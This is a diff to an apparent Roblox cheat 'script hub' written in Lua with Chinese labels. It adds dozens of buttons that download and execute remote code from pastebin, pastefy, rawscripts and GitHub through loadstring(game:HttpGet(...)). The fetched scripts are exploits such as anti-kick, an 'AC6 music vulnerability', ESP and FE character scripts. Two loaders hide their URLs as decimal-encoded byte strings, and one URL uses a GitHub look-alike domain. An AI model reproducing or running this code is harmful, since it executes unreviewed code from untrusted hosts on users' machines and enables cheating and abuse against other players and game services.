+        loadstring(game:HttpGet(('https://pastebin.com/raw/yP7NE6GN'),true))()
+        showNotification("FE激光炮已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE蜘蛛
+    local function loadFESpider()
+        playClickSound()
+        loadstring(game:HttpGet(('https://rawgithubusercontent.com/0Ben1/sushi/main/X'),true))()
+        showNotification("FE蜘蛛已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE R15角斗士
+    local function loadFER15Gladiator()
+        playClickSound()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/fEyv4jXg'),true))()
+        showNotification("FE R15角斗士已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE僵尸
+    local function loadFEZombie()
+        playClickSound()
+        loadstring(game:HttpGet('https://gist.githubusercontent.com/1BlueCat/7668ee0c4e1b352d8ac51efd6ed6f3fc/raw/d6421d586bf9b5d2e3fc0ebf14203c849494ec5f/FE%2520Zombie'))()
+        showNotification("FE僵尸已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE激光
+    local function loadFELaser()
+        playClickSound()
+        loadstring(game:HttpGet(('https://pastefy.ga/Gjlleuea/raw'),true))()
+        showNotification("FE激光已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE狒狒
+    local function loadFEBaboon()
+        playClickSound()
+        loadstring(game:HttpGet(('https://pastefy.ga/osEThPw1/raw'),true))()
+        showNotification("FE狒狒已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE船员
+    local function loadFECrew()
+        playClickSound()
+        loadstring(game:HttpGet(('https://pastefy.ga/7xEZRqfH/raw'),true))()
+        showNotification("FE船员已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE苦力怕
+    local function loadFECreeper()
+        playClickSound()
+        loadstring(game:HttpGet(('https://pastefy.ga/Kqi7ZcbX/raw'),true))()
+        showNotification("FE苦力怕已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE不要饰品的蛇
+    local function loadFENoSkinSnake()
+        playClickSound()
+        loadstring(game:HttpGet(('https://pastefy.ga/tWBTcE4R/raw'),true))()
+        showNotification("FE不要饰品的蛇已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE超人
+    local function loadFESuperman()
+        playClickSound()
+        loadstring(game:HttpGet("https://pastebin.com/raw/5yLUa0Dd"))()
+        showNotification("FE超人已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE复仇者
+    local function loadFEAvenger()
+        playClickSound()
+        loadstring(game:HttpGet(('https://pastefy.ga/iGyVaTvs/raw'),true))()
+        showNotification("FE复仇者已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE黑暗生物
+    local function loadFEDarkCreature()
+        playClickSound()
+        loadstring(game:HttpGet(("https://pastebin.com/raw/pF3atfQF"),true))()
+        showNotification("FE黑暗生物已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE官方之锤
+    local function loadFEOfficialHammer()
+        playClickSound()
+        loadstring(game:HttpGet('https://pastebin.com/raw/bG4Bean4'))()
+        showNotification("FE官方之锤已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE防踢
+    local function loadFEAntiKick()
+        playClickSound()
+        loadstring(game:HttpGet("https://pastebin.com/raw/JTMNb3qQ"))()
+        showNotification("FE防踢已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE N00kla5K菜单
+    local function loadFEN00kla5KMenu()
+        playClickSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-N00kla5K-f3x-gui-80801"))()
+        showNotification("FE N00kla5K菜单已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE AC6漏洞放音乐
+    local function loadFEAC6MusicVul()
+        playClickSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Ac6-Music-Vulnerability-25536"))()
+        showNotification("FE AC6漏洞放音乐已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- FE happyhud
+    local function loadFEHappyHud()
+        playClickSound()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-HappyHub-SS-FE-80659"))()
+        showNotification("FE happyhud已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- 导管中心
+    local function loadConduitCenter()
+        playClickSound()
+        loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
+        showNotification("导管中心已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
+    -- xa俄亥俄州脚本
+    local function loadXAOhioScript()
+        playClickSound()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/俄亥俄州.lua"))()
+        showNotification("xa俄亥俄州脚本已加载!", Color3.fromRGB(0, 200, 0))
+    end
+
     -- 绑定按钮事件
     MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
     CloseButton.MouseButton1Click:Connect(function()
@@ -2222,6 +2633,7 @@ print("安全版自然灾害免疫已激活")
         WalkAirButton = loadWalkAir,
         PlayerESPButton = togglePlayerESP,
         BulletTrackButton = toggleBulletTrack,
+        ConduitCenterButton = loadConduitCenter,  -- 新增
         
         -- 移动功能
         SpinButton = toggleSpin,
@@ -2277,6 +2689,38 @@ print("安全版自然灾害免疫已激活")
         FE1x1x1x1Button = loadFE1x1x1x1,
         FEHotlineRifleButton = loadFEHotlineRifle,
         FEIronFistButton = loadFEIronFist,
+        FEScriptV2Button = loadFEScriptV2,  -- 新增
+        FEGatlingButton = loadFEGatling,  -- 新增
+        FEPunchButton = loadFEPunch,  -- 新增
+        FEMotorcycleButton = loadFEMotorcycle,  -- 新增
+        FEBanHammerButton = loadFEBanHammer,  -- 新增
+        FEGatling2Button = loadFEGatling2,  -- 新增
+        FENoriButton = loadFENori,  -- 新增
+        FEGuest666Button = loadFEGuest666,  -- 新增
+        FEKeyboardButton = loadFEKeyboard,  -- 新增
+        FEScriptV3Button = loadFEScriptV3,  -- 新增
+        FEWallJumpButton = loadFEWallJump,  -- 新增
+        FEFightAnimButton = loadFEFightAnim,  -- 新增
+        FER6NoHeadButton = loadFER6NoHead,  -- 新增
+        FER15NoHeadButton = loadFER15NoHead,  -- 新增
+        FEMrSleepButton = loadFEMrSleep,  -- 新增
+        FELaserGunButton = loadFELaserGun,  -- 新增
+        FESpiderButton = loadFESpider,  -- 新增
+        FER15GladiatorButton = loadFER15Gladiator,  -- 新增
+        FEZombieButton = loadFEZombie,  -- 新增
+        FELaserButton = loadFELaser,  -- 新增
+        FEBaboonButton = loadFEBaboon,  -- 新增
+        FECrewButton = loadFECrew,  -- 新增
+        FECreeperButton = loadFECreeper,  -- 新增
+        FENoSkinSnakeButton = loadFENoSkinSnake,  -- 新增
+        FESupermanButton = loadFESuperman,  -- 新增
+        FEAvengerButton = loadFEAvenger,  -- 新增
+        FEDarkCreatureButton = loadFEDarkCreature,  -- 新增
+        FEOfficialHammerButton = loadFEOfficialHammer,  -- 新增
+        FEAntiKickButton = loadFEAntiKick,  -- 新增
+        FEN00kla5KMenuButton = loadFEN00kla5KMenu,  -- 新增
+        FEAC6MusicVulButton = loadFEAC6MusicVul,  -- 新增
+        FEHappyHudButton = loadFEHappyHud,  -- 新增
         
         -- 黑洞功能
         BlackHoleV6Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V6.txt", "黑洞v6") end,
@@ -2298,8 +2742,6 @@ print("安全版自然灾害免疫已激活")
         FreePrivateServerButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/Kenny免费私服.lua", "免费私服") end,
         CaodanButton = function() loadExternalScript("https://pastebin.com/raw/hkyuHQ7Y", "操蛋脚本") end,
         CaodanV1Button = loadCaodanV1,
-        OhioButton = function() loadExternalScript("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/ehaiezhou", "俄亥俄州脚本") end,
-        Ohio2Button = loadOhio2,
         ThrowFlyButton = function() loadExternalScript("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6", "甩飞脚本") end,
         BeatDogButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/KENNY爆打黄油.txt", "Kenny悦服循环打狗") end,
         WitherStormButton = function()
@@ -2326,6 +2768,7 @@ print("安全版自然灾害免疫已激活")
         NaturalDisasterButton = loadNaturalDisaster,
         MuscleLegendButton = loadMuscleLegend,
         MuscleLegendChangeButton = loadMuscleLegendChange,
+        PlayForsakenServerButton = loadPlayForsakenServer,  -- 新增
         
         -- doors
         DoorsButton = loadDoors,
@@ -2355,12 +2798,16 @@ print("安全版自然灾害免疫已激活")
         DingScriptButton = loadDingScript,
         ScriptCenterButton = function() 
             playClickSound()
-            loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
+            loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,57,68,37,65,49,37,69,54,37,65,67,37,66,69,37,69,53,37,56,68,37,56,70,37,69,56,37,65,69,37,65,69,34,41,41,40,41})end)()))()
             showNotification("脚本中心已加载!", Color3.fromRGB(0, 200, 0))
         end,
         XAScriptCenterButton = loadXAScriptCenter,
         ChenScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/qwrt5589/eododo/main/XG_SYNB.txt", "辰脚本") end,
         ShaScriptButton = function() loadExternalScript("https://raw.githubusercontent.com/114514lzkill/SaHUB/refs/heads/main/SaHUB", "沙脚本") end,
+        BSCenterButton = loadBSCenter,  -- 新增
+        BlackWhiteScriptButton = loadBlackWhiteScript,  -- 新增
+        ArcticScriptCenterButton = loadArcticScriptCenter,  -- 新增
+        NanningCenterButton = loadNanningCenter,  -- 新增
         
         -- 免费r币
         Free80RButton = showFreeRBCurrencyEffect,
@@ -2382,6 +2829,18 @@ print("安全版自然灾害免疫已激活")
         -- 无敌少侠飞行
         InvincibleFlyR15Button = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414", "无敌少侠飞行R15") end,
         InvincibleFlyR6Button = toggleInvincibleFlyR6,
+        
+        -- 俄亥俄州
+        OhioButton = function() loadExternalScript("https://raw.githubusercontent.com/jiankeQWQ/jiankeV3/main/ehaiezhou", "俄亥俄州脚本") end,
+        Ohio2Button = loadOhio2,
+        Ohio3Button = loadOhio3,  -- 新增
+        OhioMoneyMachineButton = loadOhioMoneyMachine,  -- 新增
+        Ohio4Button = loadOhio4,  -- 新增
+        XAOhioScriptButton = loadXAOhioScript,  -- 新增
+        
+        -- 画我
+        DrawMeScript1Button = loadDrawMeScript1,  -- 新增
+        DrawMeScript2Button = loadDrawMeScript2  -- 新增
     }
 
     for buttonName, action in pairs(buttonActions) do
